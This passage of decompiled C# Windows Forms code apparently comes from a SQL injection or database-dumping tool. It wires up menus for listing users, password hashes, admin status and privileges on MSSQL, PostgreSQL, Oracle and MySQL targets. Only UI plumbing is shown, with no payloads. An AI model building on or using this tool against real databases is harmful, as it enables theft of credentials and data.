				checkBox.CheckedChanged += eventHandler;
			}
		}
	}

	// Token: 0x17000172 RID: 370
	// (get) Token: 0x060004BC RID: 1212 RVA: 0x00021E20 File Offset: 0x00020020
	// (set) Token: 0x060004BD RID: 1213 RVA: 0x00021E28 File Offset: 0x00020028
	internal virtual CheckBox chkMSSQL_Latin1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000173 RID: 371
	// (get) Token: 0x060004BE RID: 1214 RVA: 0x00021E34 File Offset: 0x00020034
	// (set) Token: 0x060004BF RID: 1215 RVA: 0x00021E3C File Offset: 0x0002003C
	internal virtual ComboBox cmbMSSQLCast
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000174 RID: 372
	// (get) Token: 0x060004C0 RID: 1216 RVA: 0x00021E48 File Offset: 0x00020048
	// (set) Token: 0x060004C1 RID: 1217 RVA: 0x00021E50 File Offset: 0x00020050
	internal virtual SplitContainer splData
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000175 RID: 373
	// (get) Token: 0x060004C2 RID: 1218 RVA: 0x00021E5C File Offset: 0x0002005C
	// (set) Token: 0x060004C3 RID: 1219 RVA: 0x00021E64 File Offset: 0x00020064
	internal virtual ContextMenuStrip ctmTemplatesPostgreSQL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000176 RID: 374
	// (get) Token: 0x060004C4 RID: 1220 RVA: 0x00021E70 File Offset: 0x00020070
	// (set) Token: 0x060004C5 RID: 1221 RVA: 0x00021E78 File Offset: 0x00020078
	internal virtual ToolStripMenuItem mnuPostgreSQL_ListUsers
	{
		[CompilerGenerated]
		get
		{
			return this._mnuPostgreSQL_ListUsers;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_135);
			ToolStripMenuItem toolStripMenuItem = this._mnuPostgreSQL_ListUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuPostgreSQL_ListUsers = value;
			toolStripMenuItem = this._mnuPostgreSQL_ListUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000177 RID: 375
	// (get) Token: 0x060004C6 RID: 1222 RVA: 0x00021EBC File Offset: 0x000200BC
	// (set) Token: 0x060004C7 RID: 1223 RVA: 0x00021EC4 File Offset: 0x000200C4
	internal virtual ToolStripMenuItem mnuPostgreSQL_Passwords
	{
		[CompilerGenerated]
		get
		{
			return this._mnuPostgreSQL_Passwords;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_136);
			ToolStripMenuItem toolStripMenuItem = this._mnuPostgreSQL_Passwords;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuPostgreSQL_Passwords = value;
			toolStripMenuItem = this._mnuPostgreSQL_Passwords;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000178 RID: 376
	// (get) Token: 0x060004C8 RID: 1224 RVA: 0x00021F08 File Offset: 0x00020108
	// (set) Token: 0x060004C9 RID: 1225 RVA: 0x00021F10 File Offset: 0x00020110
	internal virtual ToolStripMenuItem mnuPostgreSQL_Join
	{
		[CompilerGenerated]
		get
		{
			return this._mnuPostgreSQL_Join;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_137);
			ToolStripMenuItem toolStripMenuItem = this._mnuPostgreSQL_Join;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuPostgreSQL_Join = value;
			toolStripMenuItem = this._mnuPostgreSQL_Join;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000179 RID: 377
	// (get) Token: 0x060004CA RID: 1226 RVA: 0x00021F54 File Offset: 0x00020154
	// (set) Token: 0x060004CB RID: 1227 RVA: 0x00021F5C File Offset: 0x0002015C
	internal virtual ContextMenuStrip ctmTemplatesOracle
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700017A RID: 378
	// (get) Token: 0x060004CC RID: 1228 RVA: 0x00021F68 File Offset: 0x00020168
	// (set) Token: 0x060004CD RID: 1229 RVA: 0x00021F70 File Offset: 0x00020170
	internal virtual ToolStripMenuItem mnuOracleListUsers
	{
		[CompilerGenerated]
		get
		{
			return this._mnuOracleListUsers;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_131);
			ToolStripMenuItem toolStripMenuItem = this._mnuOracleListUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuOracleListUsers = value;
			toolStripMenuItem = this._mnuOracleListUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700017B RID: 379
	// (get) Token: 0x060004CE RID: 1230 RVA: 0x00021FB4 File Offset: 0x000201B4
	// (set) Token: 0x060004CF RID: 1231 RVA: 0x00021FBC File Offset: 0x000201BC
	internal virtual ToolStripMenuItem mnuOracleHashes
	{
		[CompilerGenerated]
		get
		{
			return this._mnuOracleHashes;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_133);
			ToolStripMenuItem toolStripMenuItem = this._mnuOracleHashes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuOracleHashes = value;
			toolStripMenuItem = this._mnuOracleHashes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700017C RID: 380
	// (get) Token: 0x060004D0 RID: 1232 RVA: 0x00022000 File Offset: 0x00020200
	// (set) Token: 0x060004D1 RID: 1233 RVA: 0x00022008 File Offset: 0x00020208
	internal virtual ToolStripMenuItem mnuOracleJoin
	{
		[CompilerGenerated]
		get
		{
			return this._mnuOracleJoin;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_134);
			ToolStripMenuItem toolStripMenuItem = this._mnuOracleJoin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuOracleJoin = value;
			toolStripMenuItem = this._mnuOracleJoin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700017D RID: 381
	// (get) Token: 0x060004D2 RID: 1234 RVA: 0x0002204C File Offset: 0x0002024C
	// (set) Token: 0x060004D3 RID: 1235 RVA: 0x00022054 File Offset: 0x00020254
	internal virtual ToolStripSeparator ToolStripSeparator24
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700017E RID: 382
	// (get) Token: 0x060004D4 RID: 1236 RVA: 0x00022060 File Offset: 0x00020260
	// (set) Token: 0x060004D5 RID: 1237 RVA: 0x00022068 File Offset: 0x00020268
	internal virtual ToolStripMenuItem mnuOracleHelp
	{
		[CompilerGenerated]
		get
		{
			return this._mnuOracleHelp;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_132);
			ToolStripMenuItem toolStripMenuItem = this._mnuOracleHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuOracleHelp = value;
			toolStripMenuItem = this._mnuOracleHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700017F RID: 383
	// (get) Token: 0x060004D6 RID: 1238 RVA: 0x000220AC File Offset: 0x000202AC
	// (set) Token: 0x060004D7 RID: 1239 RVA: 0x000220B4 File Offset: 0x000202B4
	internal virtual ContextMenuStrip ctmTemplatesMSSQL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000180 RID: 384
	// (get) Token: 0x060004D8 RID: 1240 RVA: 0x000220C0 File Offset: 0x000202C0
	// (set) Token: 0x060004D9 RID: 1241 RVA: 0x000220C8 File Offset: 0x000202C8
	internal virtual ToolStripMenuItem mnuSqlLogins
	{
		[CompilerGenerated]
		get
		{
			return this._mnuSqlLogins;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_126);
			ToolStripMenuItem toolStripMenuItem = this._mnuSqlLogins;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuSqlLogins = value;
			toolStripMenuItem = this._mnuSqlLogins;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000181 RID: 385
	// (get) Token: 0x060004DA RID: 1242 RVA: 0x0002210C File Offset: 0x0002030C
	// (set) Token: 0x060004DB RID: 1243 RVA: 0x00022114 File Offset: 0x00020314
	internal virtual ToolStripMenuItem mnuSqlIsAdmin
	{
		[CompilerGenerated]
		get
		{
			return this._mnuSqlIsAdmin;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_127);
			ToolStripMenuItem toolStripMenuItem = this._mnuSqlIsAdmin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuSqlIsAdmin = value;
			toolStripMenuItem = this._mnuSqlIsAdmin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000182 RID: 386
	// (get) Token: 0x060004DC RID: 1244 RVA: 0x00022158 File Offset: 0x00020358
	// (set) Token: 0x060004DD RID: 1245 RVA: 0x00022160 File Offset: 0x00020360
	internal virtual ToolStripMenuItem mnuSQLJoin
	{
		[CompilerGenerated]
		get
		{
			return this._mnuSQLJoin;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_128);
			ToolStripMenuItem toolStripMenuItem = this._mnuSQLJoin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuSQLJoin = value;
			toolStripMenuItem = this._mnuSQLJoin;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000183 RID: 387
	// (get) Token: 0x060004DE RID: 1246 RVA: 0x000221A4 File Offset: 0x000203A4
	// (set) Token: 0x060004DF RID: 1247 RVA: 0x000221AC File Offset: 0x000203AC
	internal virtual ToolStripSeparator ToolStripMenuItem1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000184 RID: 388
	// (get) Token: 0x060004E0 RID: 1248 RVA: 0x000221B8 File Offset: 0x000203B8
	// (set) Token: 0x060004E1 RID: 1249 RVA: 0x000221C0 File Offset: 0x000203C0
	internal virtual ToolStripMenuItem mnuSQLHelp
	{
		[CompilerGenerated]
		get
		{
			return this._mnuSQLHelp;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_129);
			ToolStripMenuItem toolStripMenuItem = this._mnuSQLHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuSQLHelp = value;
			toolStripMenuItem = this._mnuSQLHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000185 RID: 389
	// (get) Token: 0x060004E2 RID: 1250 RVA: 0x00022204 File Offset: 0x00020404
	// (set) Token: 0x060004E3 RID: 1251 RVA: 0x0002220C File Offset: 0x0002040C
	internal virtual BackgroundWorker bckWorker
	{
		[CompilerGenerated]
		get
		{
			return this.backgroundWorker_0;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DoWorkEventHandler doWorkEventHandler = new DoWorkEventHandler(this.method_11);
			ProgressChangedEventHandler progressChangedEventHandler = new ProgressChangedEventHandler(this.method_12);
			RunWorkerCompletedEventHandler runWorkerCompletedEventHandler = new RunWorkerCompletedEventHandler(this.method_13);
			BackgroundWorker backgroundWorker = this.backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= doWorkEventHandler;
				backgroundWorker.ProgressChanged -= progressChangedEventHandler;
				backgroundWorker.RunWorkerCompleted -= runWorkerCompletedEventHandler;
			}
			this.backgroundWorker_0 = value;
			backgroundWorker = this.backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += doWorkEventHandler;
				backgroundWorker.ProgressChanged += progressChangedEventHandler;
				backgroundWorker.RunWorkerCompleted += runWorkerCompletedEventHandler;
			}
		}
	}

	// Token: 0x17000186 RID: 390
	// (get) Token: 0x060004E4 RID: 1252 RVA: 0x00022288 File Offset: 0x00020488
	// (set) Token: 0x060004E5 RID: 1253 RVA: 0x00022290 File Offset: 0x00020490
	internal virtual ToolTip tlpUrl
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000187 RID: 391
	// (get) Token: 0x060004E6 RID: 1254 RVA: 0x0002229C File Offset: 0x0002049C
	// (set) Token: 0x060004E7 RID: 1255 RVA: 0x000222A4 File Offset: 0x000204A4
	internal virtual ContextMenuStrip ctmTemplatesFilters
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000188 RID: 392
	// (get) Token: 0x060004E8 RID: 1256 RVA: 0x000222B0 File Offset: 0x000204B0
	// (set) Token: 0x060004E9 RID: 1257 RVA: 0x000222B8 File Offset: 0x000204B8
	internal virtual ToolStripMenuItem mnuFilters1
	{
		[CompilerGenerated]
		get
		{
			return this._mnuFilters1;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_120);
			ToolStripMenuItem toolStripMenuItem = this._mnuFilters1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuFilters1 = value;
			toolStripMenuItem = this._mnuFilters1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000189 RID: 393
	// (get) Token: 0x060004EA RID: 1258 RVA: 0x000222FC File Offset: 0x000204FC
	// (set) Token: 0x060004EB RID: 1259 RVA: 0x00022304 File Offset: 0x00020504
	internal virtual ToolStripMenuItem mnuFilters2
	{
		[CompilerGenerated]
		get
		{
			return this._mnuFilters2;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_120);
			ToolStripMenuItem toolStripMenuItem = this._mnuFilters2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuFilters2 = value;
			toolStripMenuItem = this._mnuFilters2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700018A RID: 394
	// (get) Token: 0x060004EC RID: 1260 RVA: 0x00022348 File Offset: 0x00020548
	// (set) Token: 0x060004ED RID: 1261 RVA: 0x00022350 File Offset: 0x00020550
	internal virtual ToolStripMenuItem mnuFilters5
	{
		[CompilerGenerated]
		get
		{
			return this._mnuFilters5;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_120);
			ToolStripMenuItem toolStripMenuItem = this._mnuFilters5;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuFilters5 = value;
			toolStripMenuItem = this._mnuFilters5;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700018B RID: 395
	// (get) Token: 0x060004EE RID: 1262 RVA: 0x00022394 File Offset: 0x00020594
	// (set) Token: 0x060004EF RID: 1263 RVA: 0x0002239C File Offset: 0x0002059C
	internal virtual ToolStripMenuItem mnuFilters6
	{
		[CompilerGenerated]
		get
		{
			return this._mnuFilters6;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_120);
			ToolStripMenuItem toolStripMenuItem = this._mnuFilters6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuFilters6 = value;
			toolStripMenuItem = this._mnuFilters6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700018C RID: 396
	// (get) Token: 0x060004F0 RID: 1264 RVA: 0x000223E0 File Offset: 0x000205E0
	// (set) Token: 0x060004F1 RID: 1265 RVA: 0x000223E8 File Offset: 0x000205E8
	internal virtual ToolStripMenuItem mnuFilters7
	{
		[CompilerGenerated]
		get
		{
			return this._mnuFilters7;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_120);
			ToolStripMenuItem toolStripMenuItem = this._mnuFilters7;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuFilters7 = value;
			toolStripMenuItem = this._mnuFilters7;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700018D RID: 397
	// (get) Token: 0x060004F2 RID: 1266 RVA: 0x0002242C File Offset: 0x0002062C
	// (set) Token: 0x060004F3 RID: 1267 RVA: 0x00022434 File Offset: 0x00020634
	internal virtual ToolStripMenuItem mnuFilters8
	{
		[CompilerGenerated]
		get
		{
			return this._mnuFilters8;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_120);
			ToolStripMenuItem toolStripMenuItem = this._mnuFilters8;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuFilters8 = value;
			toolStripMenuItem = this._mnuFilters8;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700018E RID: 398
	// (get) Token: 0x060004F4 RID: 1268 RVA: 0x00022478 File Offset: 0x00020678
	// (set) Token: 0x060004F5 RID: 1269 RVA: 0x00022480 File Offset: 0x00020680
	internal virtual ToolStripMenuItem mnuFilters9
	{
		[CompilerGenerated]
		get
		{
			return this._mnuFilters9;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_120);
			ToolStripMenuItem toolStripMenuItem = this._mnuFilters9;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuFilters9 = value;
			toolStripMenuItem = this._mnuFilters9;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700018F RID: 399
	// (get) Token: 0x060004F6 RID: 1270 RVA: 0x000224C4 File Offset: 0x000206C4
	// (set) Token: 0x060004F7 RID: 1271 RVA: 0x000224CC File Offset: 0x000206CC
	internal virtual ToolStripMenuItem mnuFilters10
	{
		[CompilerGenerated]
		get
		{
			return this._mnuFilters10;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_120);
			ToolStripMenuItem toolStripMenuItem = this._mnuFilters10;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuFilters10 = value;
			toolStripMenuItem = this._mnuFilters10;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000190 RID: 400
	// (get) Token: 0x060004F8 RID: 1272 RVA: 0x00022510 File Offset: 0x00020710
	// (set) Token: 0x060004F9 RID: 1273 RVA: 0x00022518 File Offset: 0x00020718
	internal virtual ToolStripMenuItem mnuFilters3
	{
		[CompilerGenerated]
		get
		{
			return this._mnuFilters3;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_120);
			ToolStripMenuItem toolStripMenuItem = this._mnuFilters3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuFilters3 = value;
			toolStripMenuItem = this._mnuFilters3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x17000191 RID: 401
	// (get) Token: 0x060004FA RID: 1274 RVA: 0x0002255C File Offset: 0x0002075C
	// (set) Token: 0x060004FB RID: 1275 RVA: 0x00022564 File Offset: 0x00020764
	internal virtual ToolStripMenuItem ToolStripMenuItem12
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000192 RID: 402
	// (get) Token: 0x060004FC RID: 1276 RVA: 0x00022570 File Offset: 0x00020770
	// (set) Token: 0x060004FD RID: 1277 RVA: 0x00022578 File Offset: 0x00020778
	internal virtual ContextMenuStrip ctmSchema
	{
		[CompilerGenerated]
		get
		{
			return this._mnuListView_2;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			CancelEventHandler cancelEventHandler = new CancelEventHandler(this.method_118);
			ContextMenuStrip contextMenuStrip = this._mnuListView_2;
			if (contextMenuStrip != null)
			{
				contextMenuStrip.Opening -= cancelEventHandler;
			}
			this._mnuListView_2 = value;
			contextMenuStrip = this._mnuListView_2;
			if (contextMenuStrip != null)
			{
				contextMenuStrip.Opening += cancelEventHandler;
			}
		}
	}

	// Token: 0x17000193 RID: 403
	// (get) Token: 0x060004FE RID: 1278 RVA: 0x000225BC File Offset: 0x000207BC
	// (set) Token: 0x060004FF RID: 1279 RVA: 0x000225C4 File Offset: 0x000207C4
	internal virtual ToolStripMenuItem mnuSchema0
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000194 RID: 404
	// (get) Token: 0x06000500 RID: 1280 RVA: 0x000225D0 File Offset: 0x000207D0
	// (set) Token: 0x06000501 RID: 1281 RVA: 0x000225D8 File Offset: 0x000207D8
	internal virtual ToolStripMenuItem mnuSchema1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000195 RID: 405
	// (get) Token: 0x06000502 RID: 1282 RVA: 0x000225E4 File Offset: 0x000207E4
	// (set) Token: 0x06000503 RID: 1283 RVA: 0x000225EC File Offset: 0x000207EC
	internal virtual ToolStripMenuItem mnuSchema2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000196 RID: 406
	// (get) Token: 0x06000504 RID: 1284 RVA: 0x000225F8 File Offset: 0x000207F8
	// (set) Token: 0x06000505 RID: 1285 RVA: 0x00022600 File Offset: 0x00020800
	internal virtual ToolStripMenuItem mnuSchema3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000197 RID: 407
	// (get) Token: 0x06000506 RID: 1286 RVA: 0x0002260C File Offset: 0x0002080C
	// (set) Token: 0x06000507 RID: 1287 RVA: 0x00022614 File Offset: 0x00020814
	internal virtual ToolStripMenuItem mnuSchema4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000198 RID: 408
	// (get) Token: 0x06000508 RID: 1288 RVA: 0x00022620 File Offset: 0x00020820
	// (set) Token: 0x06000509 RID: 1289 RVA: 0x00022628 File Offset: 0x00020828
	internal virtual ToolStripMenuItem mnuSchema5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x17000199 RID: 409
	// (get) Token: 0x0600050A RID: 1290 RVA: 0x00022634 File Offset: 0x00020834
	// (set) Token: 0x0600050B RID: 1291 RVA: 0x0002263C File Offset: 0x0002083C
	internal virtual ToolStripMenuItem mnuSchema6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700019A RID: 410
	// (get) Token: 0x0600050C RID: 1292 RVA: 0x00022648 File Offset: 0x00020848
	// (set) Token: 0x0600050D RID: 1293 RVA: 0x00022650 File Offset: 0x00020850
	internal virtual ToolStripMenuItem mnuSchema7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700019B RID: 411
	// (get) Token: 0x0600050E RID: 1294 RVA: 0x0002265C File Offset: 0x0002085C
	// (set) Token: 0x0600050F RID: 1295 RVA: 0x00022664 File Offset: 0x00020864
	internal virtual ToolStripMenuItem mnuSchema8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700019C RID: 412
	// (get) Token: 0x06000510 RID: 1296 RVA: 0x00022670 File Offset: 0x00020870
	// (set) Token: 0x06000511 RID: 1297 RVA: 0x00022678 File Offset: 0x00020878
	internal virtual ToolStripMenuItem mnuSchema9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700019D RID: 413
	// (get) Token: 0x06000512 RID: 1298 RVA: 0x00022684 File Offset: 0x00020884
	// (set) Token: 0x06000513 RID: 1299 RVA: 0x0002268C File Offset: 0x0002088C
	internal virtual BackgroundWorker bckAlexa
	{
		[CompilerGenerated]
		get
		{
			return this.backgroundWorker_1;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			DoWorkEventHandler doWorkEventHandler = new DoWorkEventHandler(this.method_138);
			RunWorkerCompletedEventHandler runWorkerCompletedEventHandler = new RunWorkerCompletedEventHandler(this.method_139);
			BackgroundWorker backgroundWorker = this.backgroundWorker_1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= doWorkEventHandler;
				backgroundWorker.RunWorkerCompleted -= runWorkerCompletedEventHandler;
			}
			this.backgroundWorker_1 = value;
			backgroundWorker = this.backgroundWorker_1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += doWorkEventHandler;
				backgroundWorker.RunWorkerCompleted += runWorkerCompletedEventHandler;
			}
		}
	}

	// Token: 0x1700019E RID: 414
	// (get) Token: 0x06000514 RID: 1300 RVA: 0x000226EC File Offset: 0x000208EC
	// (set) Token: 0x06000515 RID: 1301 RVA: 0x000226F4 File Offset: 0x000208F4
	internal virtual ContextMenuStrip ctmTemplatesMySQL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	// Token: 0x1700019F RID: 415
	// (get) Token: 0x06000516 RID: 1302 RVA: 0x00022700 File Offset: 0x00020900
	// (set) Token: 0x06000517 RID: 1303 RVA: 0x00022708 File Offset: 0x00020908
	internal virtual ToolStripMenuItem mnuUsers
	{
		[CompilerGenerated]
		get
		{
			return this._mnuUsers;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_112);
			ToolStripMenuItem toolStripMenuItem = this._mnuUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuUsers = value;
			toolStripMenuItem = this._mnuUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001A0 RID: 416
	// (get) Token: 0x06000518 RID: 1304 RVA: 0x0002274C File Offset: 0x0002094C
	// (set) Token: 0x06000519 RID: 1305 RVA: 0x00022754 File Offset: 0x00020954
	internal virtual ToolStripMenuItem mnuPrivileges
	{
		[CompilerGenerated]
		get
		{
			return this._mnuPrivileges;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_111);
			ToolStripMenuItem toolStripMenuItem = this._mnuPrivileges;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuPrivileges = value;
			toolStripMenuItem = this._mnuPrivileges;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001A1 RID: 417
	// (get) Token: 0x0600051A RID: 1306 RVA: 0x00022798 File Offset: 0x00020998
	// (set) Token: 0x0600051B RID: 1307 RVA: 0x000227A0 File Offset: 0x000209A0
	internal virtual ToolStripMenuItem mnuListDBA
	{
		[CompilerGenerated]
		get
		{
			return this._mnuListDBA;
		}
		[CompilerGenerated]
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = new EventHandler(this.method_105);
			ToolStripMenuItem toolStripMenuItem = this._mnuListDBA;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= eventHandler;
			}
			this._mnuListDBA = value;
			toolStripMenuItem = this._mnuListDBA;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += eventHandler;
			}
		}
	}

	// Token: 0x170001A2 RID: 418
